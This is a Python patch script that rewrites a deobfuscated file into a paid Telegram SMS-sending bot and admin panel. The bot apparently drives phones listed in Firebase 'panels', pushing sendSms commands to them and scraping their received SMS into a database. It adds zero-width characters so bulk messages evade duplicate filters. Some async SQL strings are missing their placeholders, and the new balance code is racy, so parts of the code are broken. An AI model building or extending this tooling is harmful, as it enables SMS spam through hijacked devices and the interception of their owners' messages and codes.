﻿import re

with open('decoded.py', 'r', encoding='utf-8') as f:
    code = f.read()

# 1. Add schema for from_number and to_number
old_schema = '''    pg.execute_write("""CREATE TABLE IF NOT EXISTS sms_received (
        id SERIAL PRIMARY KEY,
        number TEXT,
        message TEXT,
        panel TEXT,
        received_at TEXT
    )""")'''

new_schema = '''    pg.execute_write("""CREATE TABLE IF NOT EXISTS sms_received (
        id SERIAL PRIMARY KEY,
        number TEXT,
        from_number TEXT,
        to_number TEXT,
        message TEXT,
        panel TEXT,
        received_at TEXT
    )""")
    pg.execute_write("ALTER TABLE sms_received ADD COLUMN IF NOT EXISTS from_number TEXT")
    pg.execute_write("ALTER TABLE sms_received ADD COLUMN IF NOT EXISTS to_number TEXT")'''

code = code.replace(old_schema, new_schema)

# 2. Update execute_one in PgConn
old_exec_one = '''    def execute_one(self, query, params=None, dict_cursor=False):
        with self.cursor(commit=False, dict_cursor=dict_cursor) as cur:'''

new_exec_one = '''    def execute_one(self, query, params=None, dict_cursor=False, commit=False):
        with self.cursor(commit=commit, dict_cursor=dict_cursor) as cur:'''

code = code.replace(old_exec_one, new_exec_one)

# 3. Replace async deduct_balance and add_balance
old_deduct_async = '''async def deduct_balance(uid: int, amount: float) -> bool:
    uid_str = str(uid)
    async with pool.acquire() as conn:
        result = await conn.execute(
            "UPDATE users SET balance = balance -  WHERE user_id =  AND balance >= ",
            amount,
            uid_str,
        )
    await redis_client.delete(f"user:{uid_str}")
    return result == "UPDATE 1"'''

new_deduct_async = '''async def deduct_balance(uid: int, amount: float) -> bool:
    uid_str = str(uid)
    amt = round(float(amount), 4)
    async with pool.acquire() as conn:
        row = await conn.fetchrow("SELECT balance FROM users WHERE user_id = ", uid_str)
        if not row:
            return False
        current_bal = float(row["balance"] or 0)
        if round(current_bal, 2) < round(amt, 2):
            return False
        new_bal = max(0.0, current_bal - amt)
        await conn.execute("UPDATE users SET balance =  WHERE user_id = ", new_bal, uid_str)
    if redis_client:
        try:
            await redis_client.delete(f"user:{uid_str}")
        except Exception:
            pass
    return True'''

code = code.replace(old_deduct_async, new_deduct_async)

# 4. Replace sync usr_deduct_balance and usr_add_balance
old_usr_deduct = '''def usr_deduct_balance(uid, amount):
    row = pg.execute_one(
        "UPDATE users SET balance = balance - %s WHERE user_id = %s AND COALESCE(balance, 0) >= %s RETURNING balance",
        (amount, uid, amount),
    )
    return row is not None'''

new_usr_deduct = '''def usr_deduct_balance(uid, amount):
    uid_str = str(uid).strip()
    amt = round(float(amount), 4)
    user = pg.execute_one("SELECT balance FROM users WHERE user_id = %s", (uid_str,), dict_cursor=True)
    if not user:
        return False
    current_bal = float(user.get("balance") or 0)
    if round(current_bal, 2) < round(amt, 2):
        return False
    new_bal = max(0.0, current_bal - amt)
    pg.execute_write("UPDATE users SET balance = %s WHERE user_id = %s", (new_bal, uid_str))
    if rds:
        try:
            rds.delete(f"user:{uid_str}")
        except Exception:
            pass
    return True'''

code = code.replace(old_usr_deduct, new_usr_deduct)

old_usr_add = '''def usr_add_balance(uid, amount):
    existing = usr_get(uid)
    if not existing:
        usr_add(uid, amount)
        return
    pg.execute_write(
        "UPDATE users SET balance = COALESCE(balance, 0) + %s WHERE user_id = %s",
        (amount, uid),
    )'''

new_usr_add = '''def usr_add_balance(uid, amount):
    uid_str = str(uid).strip()
    amt = float(amount)
    existing = usr_get(uid_str)
    if not existing:
        usr_add(uid_str, amt)
    else:
        pg.execute_write(
            "UPDATE users SET balance = COALESCE(balance, 0) + %s WHERE user_id = %s",
            (amt, uid_str),
        )
    if rds:
        try:
            rds.delete(f"user:{uid_str}")
        except Exception:
            pass'''

code = code.replace(old_usr_add, new_usr_add)

# 5. Patch sms_received_add, sms_received_list, sms_received_count
old_sms_received = '''def sms_received_add(number, message, panel=""):
    pg.execute_write(
        "INSERT INTO sms_received (number, message, panel, received_at) VALUES (%s,%s,%s,%s)",
        (number, message, panel, datetime.now().isoformat())
    )


def sms_received_list(page=1, per_page=100, number=""):
    offset = (page - 1) * per_page
    if number:
        rows = pg.execute(
            "SELECT * FROM sms_received WHERE number = %s ORDER BY received_at DESC LIMIT %s OFFSET %s",
            (number, per_page, offset), dict_cursor=True
        )
    else:
        rows = pg.execute(
            "SELECT * FROM sms_received ORDER BY received_at DESC LIMIT %s OFFSET %s",
            (per_page, offset), dict_cursor=True
        )
    return rows


def sms_received_count(number=""):
    if number:
        row = pg.execute_one("SELECT COUNT(*) as c FROM sms_received WHERE number = %s", (number,))
    else:
        row = pg.execute_one("SELECT COUNT(*) as c FROM sms_received")
    return row[0] if row else 0'''

new_sms_received = '''def sms_received_add(from_number, to_number, message, panel="", received_at=None):
    if not message:
        return
    from_str = str(from_number or "").strip()
    to_str = str(to_number or "").strip()
    msg_str = str(message or "").strip()
    panel_str = str(panel or "").strip()
    ts = received_at or datetime.now().isoformat()
    try:
        existing = pg.execute_one(
            "SELECT id FROM sms_received WHERE (from_number = %s OR number = %s) AND message = %s LIMIT 1",
            (from_str, from_str, msg_str)
        )
        if existing:
            return
        pg.execute_write(
            "INSERT INTO sms_received (number, from_number, to_number, message, panel, received_at) VALUES (%s,%s,%s,%s,%s,%s)",
            (from_str, from_str, to_str, msg_str, panel_str, str(ts))
        )
    except Exception:
        pass


def sms_received_list(page=1, per_page=100, number=""):
    offset = (page - 1) * per_page
    if number:
        q = f"%{number.strip()}%"
        rows = pg.execute(
            "SELECT * FROM sms_received WHERE number ILIKE %s OR from_number ILIKE %s OR to_number ILIKE %s OR message ILIKE %s ORDER BY received_at DESC, id DESC LIMIT %s OFFSET %s",
            (q, q, q, q, per_page, offset), dict_cursor=True
        )
    else:
        rows = pg.execute(
            "SELECT * FROM sms_received ORDER BY received_at DESC, id DESC LIMIT %s OFFSET %s",
            (per_page, offset), dict_cursor=True
        )
    return rows


def sms_received_count(number=""):
    if number:
        q = f"%{number.strip()}%"
        row = pg.execute_one(
            "SELECT COUNT(*) as c FROM sms_received WHERE number ILIKE %s OR from_number ILIKE %s OR to_number ILIKE %s OR message ILIKE %s",
            (q, q, q, q)
        )
    else:
        row = pg.execute_one("SELECT COUNT(*) as c FROM sms_received")
    return row[0] if row else 0'''

code = code.replace(old_sms_received, new_sms_received)

# 6. Add send_async to PanelManager
old_send_parallel = '''    def _send_parallel(self, base_url: str, devices: list, to: str, message: str) -> tuple[bool, str, str]:
        """PUT to devices, then poll for confirmation."""
        sent_devices = []
        for device in devices:
            ok = self._put_sendSms(base_url, device["id"], to, message)
            if ok:
                sent_devices.append(device["id"])

        if not sent_devices:
            return False, "put failed", ""

        for _ in range(3):
            time.sleep(1.5)
            for cid in sent_devices:
                confirmed = self._check_confirmed(base_url, cid)
                if confirmed:
                    return True, "delivered", cid

        return True, "accepted", sent_devices[0]'''

new_send_parallel = '''    async def send_async(self, to: str, message: str) -> tuple[bool, str, str]:
        """Non-blocking async SMS sender that does not block the asyncio event loop."""
        if not self.working:
            self._sync_from_cache()
        if not self.working:
            return False, "No working panels available", ""

        total = len(self.working)
        panels_to_try = min(total, 8)

        for i in range(panels_to_try):
            panel = self.working[self._index % total]
            self._index = (self._index + 1) % total
            base_url = panel["url"]

            cached_devices = [
                d for d in LIVE_CACHE.get("online_devices", [])
                if d["panel_url"].rstrip("/") == base_url.rstrip("/")
            ]
            if not cached_devices:
                continue

            webhook_devices = [d for d in cached_devices if d.get("webhook_ready")]
            try_devices = (webhook_devices[:3] if len(webhook_devices) >= 3
                           else (webhook_devices + [d for d in cached_devices if d not in webhook_devices])[:3])

            sent_devices = []
            for device in try_devices:
                send_url = _firebase_url(base_url, f"clients/{device['id']}/webhookEvent/sendSms")
                payload = json.dumps({"from": 1, "to": to, "message": message, "isSended": False})
                try:
                    async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=8)) as session:
                        async with session.put(send_url, data=payload, headers={"Content-Type": "application/json"}) as resp:
                            if resp.status in (200, 201, 202):
                                sent_devices.append(device["id"])
                except Exception:
                    pass

            if not sent_devices:
                continue

            for _ in range(6):
                await asyncio.sleep(1.2)
                for cid in sent_devices:
                    check_url = _firebase_url(base_url, f"clients/{cid}/webhookEvent/sendSms")
                    try:
                        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=5)) as session:
                            async with session.get(check_url) as resp:
                                if resp.status == 200:
                                    data = await resp.json()
                                    if isinstance(data, dict) and (data.get("isSended") is True or data.get("isSended") == 1):
                                        await asyncio.sleep(0.3)
                                        return True, f"{panel['name']} [delivered]", cid
                    except Exception:
                        pass

            return True, f"{panel['name']} [accepted]", sent_devices[0]

        return False, "All panels failed", ""

    def _send_parallel(self, base_url: str, devices: list, to: str, message: str) -> tuple[bool, str, str]:
        """PUT to devices, then poll for confirmation."""
        sent_devices = []
        for device in devices:
            ok = self._put_sendSms(base_url, device["id"], to, message)
            if ok:
                sent_devices.append(device["id"])

        if not sent_devices:
            return False, "put failed", ""

        for _ in range(6):
            time.sleep(1.2)
            for cid in sent_devices:
                confirmed = self._check_confirmed(base_url, cid)
                if confirmed:
                    time.sleep(0.3)
                    return True, "delivered", cid

        return True, "accepted", sent_devices[0]'''

code = code.replace(old_send_parallel, new_send_parallel)

# 7. Update probe loop extraction for incoming SMS
old_probe_dev = '''                all_devices.append({
                    "id": cid,
                    "panel": panel["name"],
                    "panel_url": panel["url"].rstrip("/"),
                    "number": mobno,
                    "battery": battery,
                    "sim_info": sim_info.rstrip(" | ") if sim_info else "-",
                    "webhook_ready": bool(cdata.get("webhookEvent")),
                    "is_online": is_online,
                })'''

new_probe_dev = '''                all_devices.append({
                    "id": cid,
                    "panel": panel["name"],
                    "panel_url": panel["url"].rstrip("/"),
                    "number": mobno,
                    "battery": battery,
                    "sim_info": sim_info.rstrip(" | ") if sim_info else "-",
                    "webhook_ready": bool(cdata.get("webhookEvent")),
                    "is_online": is_online,
                })
                # Extract and store only strictly incoming/received SMS
                for sms_key in ("receivedSms", "received_sms", "inbox", "sms", "messages", "smsList", "sms_received"):
                    sms_container = cdata.get(sms_key)
                    if not sms_container:
                        continue
                    items = []
                    if isinstance(sms_container, dict):
                        items = list(sms_container.values())
                    elif isinstance(sms_container, list):
                        items = sms_container
                    for item in items[-25:]:
                        if not isinstance(item, dict):
                            continue
                        stype = str(item.get("type") or item.get("box") or item.get("folder") or item.get("direction") or "").lower()
                        if stype in ("sent", "out", "outgoing", "2", "outbox", "draft") or item.get("isSended") is True:
                            continue
                        from_num = item.get("from") or item.get("sender") or item.get("senderNumber") or item.get("address") or item.get("number") or item.get("phone") or ""
                        to_num = item.get("to") or item.get("receiver") or item.get("recipient") or item.get("dest") or mobno or ""
                        msg_text = item.get("message") or item.get("msg") or item.get("body") or item.get("text") or item.get("messageText") or ""
                        r_time = item.get("received_at") or item.get("timestamp") or item.get("date") or item.get("time") or ""
                        if from_num and msg_text:
                            sms_received_add(str(from_num), str(to_num), str(msg_text), panel["name"], str(r_time) if r_time else None)'''

code = code.replace(old_probe_dev, new_probe_dev)

# 8. Background probe interval 35s
code = code.replace('_time.sleep(300)', '_time.sleep(35)')

# 9. Update RECEIVED_SMS_PAGE template
old_rx_page = '''    <table>
      <thead><tr><th>Number</th><th>Message</th><th>Panel</th><th>Received</th></tr></thead>
      <tbody id="rxSms">
        {% for sms in messages %}
        <tr>
          <td><strong>{{ sms.number }}</strong></td>
          <td>{{ sms.message[:80] if sms.message else '-' }}</td>
          <td class="truncate">{{ sms.panel[:30] if sms.panel else '-' }}</td>
          <td>{{ sms.received_at[:16] if sms.received_at else '-' }}</td>
        </tr>
        {% endfor %}
        {% if not messages %}
        <tr><td colspan="4" style="text-align:center;color:#94a3b8;padding:28px">No received SMS</td></tr>
        {% endif %}
      </tbody>
    </table>'''

new_rx_page = '''    <table>
      <thead><tr><th>From (Sender)</th><th>To (Device SIM)</th><th>Message</th><th>Panel</th><th>Received At</th></tr></thead>
      <tbody id="rxSms">
        {% for sms in messages %}
        <tr>
          <td><strong style="color:#d4a853">{{ sms.from_number or sms.number or '-' }}</strong></td>
          <td><span style="font-weight:600;color:#38bdf8">{{ sms.to_number or '-' }}</span></td>
          <td style="max-width:340px;word-break:break-word">{{ sms.message if sms.message else '-' }}</td>
          <td class="truncate">{{ sms.panel[:30] if sms.panel else '-' }}</td>
          <td>{{ sms.received_at[:19] if sms.received_at else '-' }}</td>
        </tr>
        {% endfor %}
        {% if not messages %}
        <tr><td colspan="5" style="text-align:center;color:#94a3b8;padding:28px">No received SMS</td></tr>
        {% endif %}
      </tbody>
    </table>'''

code = code.replace(old_rx_page, new_rx_page)

# Update rx script
old_rx_js = '''  var h='';d.forEach(function(l){
  h+='<tr><td><strong>'+l.number+'</strong></td><td>'+l.message+'</td><td class="truncate">'+l.panel+'</td><td>'+l.received_at+'</td></tr>';
  });tb.innerHTML=h;'''

new_rx_js = '''  var h='';d.forEach(function(l){
  h+='<tr><td><strong style="color:#d4a853">'+escapeHtml(l.from)+'</strong></td><td><span style="font-weight:600;color:#38bdf8">'+escapeHtml(l.to)+'</span></td><td style="max-width:340px;word-break:break-word">'+escapeHtml(l.message)+'</td><td class="truncate">'+escapeHtml(l.panel)+'</td><td>'+escapeHtml(l.received_at)+'</td></tr>';
  });tb.innerHTML=h;'''

code = code.replace(old_rx_js, new_rx_js)

# 10. Update Telegram bot confirm_yes loop to use non-blocking async
old_bot_loop = '''        sent = 0
        failed = 0

        loop = asyncio.get_event_loop()
        for i in range(count):
            result = await loop.run_in_executor(None, panel_manager.send, phone, msg)
            if result[0]:
                sent += 1
                await increment_sms(uid)
                await log_sms(str(uid), phone, result[1], "sent", msg)
            else:
                failed += 1
                await log_sms(str(uid), phone, "none", "failed", result[1])

            if speed > 0 and i < count - 1:
                await asyncio.sleep(speed)'''

new_bot_loop = '''        sent = 0
        failed = 0

        for i in range(count):
            unique_msg = msg + ("\\u200b" * (i % 20))
            ok, detail, dev_id = await panel_manager.send_async(phone, unique_msg)
            if ok:
                sent += 1
                await increment_sms(uid)
                await log_sms(str(uid), phone, detail, "sent", msg)
            else:
                failed += 1
                await log_sms(str(uid), phone, "none", "failed", detail)

            if i < count - 1:
                wait_time = max(speed, 1.2) if speed == 0.1 else speed
                await asyncio.sleep(wait_time)'''

code = code.replace(old_bot_loop, new_bot_loop)

# 11. Add api/sms-received and update api/live-received
old_live_rx = '''@app.route("/api/live-received")
@login_required
def api_live_received():
    rows = pg.execute(
        "SELECT number, message, panel, received_at FROM sms_received ORDER BY received_at DESC LIMIT 15",
        dict_cursor=True
    )
    return jsonify([{
        "number": r.get("number", ""),
        "message": r.get("message", "")[:80],
        "panel": r.get("panel", ""),
        "received_at": r.get("received_at", "")[:16] if r.get("received_at") else "",
    } for r in rows])'''

new_live_rx = '''@app.route("/api/sms-received", methods=["POST"])
def api_sms_received():
    data = request.get_json(silent=True) or {}
    from_num = data.get("from") or data.get("from_number") or data.get("sender") or data.get("number") or ""
    to_num = data.get("to") or data.get("to_number") or data.get("receiver") or ""
    message = data.get("message") or data.get("text") or data.get("body") or data.get("msg") or ""
    panel = data.get("panel") or data.get("device") or "Webhook"
    if not message or (not from_num and not to_num):
        return jsonify({"error": "message and sender/receiver required"}), 400
    sms_received_add(from_num, to_num, message, panel)
    return jsonify({"status": "ok"})


@app.route("/api/live-received")
@login_required
def api_live_received():
    rows = pg.execute(
        "SELECT id, number, from_number, to_number, message, panel, received_at FROM sms_received ORDER BY received_at DESC, id DESC LIMIT 25",
        dict_cursor=True
    )
    return jsonify([{
        "from": r.get("from_number") or r.get("number") or "-",
        "to": r.get("to_number") or "-",
        "message": r.get("message", ""),
        "panel": r.get("panel", ""),
        "received_at": r.get("received_at", "")[:19] if r.get("received_at") else "",
    } for r in rows])'''

code = code.replace(old_live_rx, new_live_rx)

# 12. UTR failure message
old_utr_fail = '''        if not payment:
            await update.message.reply_text(
                "━━━━━━━━━━━━━━━━━━━━━━\\n"
                "  ❌ UTR Not Found\\n"
                "━━━━━━━━━━━━━━━━━━━━━━\\n\\n"
                "No payment found with this UTR.\\nCheck and try again:",
                reply_markup=back_markup(),
            )'''

new_utr_fail = '''        if not payment:
            await update.message.reply_text(
                "━━━━━━━━━━━━━━━━━━━━━━\\n"
                "  ❌ UTR Not Found\\n"
                "━━━━━━━━━━━━━━━━━━━━━━\\n\\n"
                "Automatic UTR verification failed.\\nPlease contact Admin with your payment screenshot.",
                reply_markup=back_markup(),
            )'''

code = code.replace(old_utr_fail, new_utr_fail)

with open('khaat_bot_final.py', 'w', encoding='utf-8') as f:
    f.write(code)

print("BUILD COMPLETE! Rupee symbols in final:", code.count('\u20b9'))
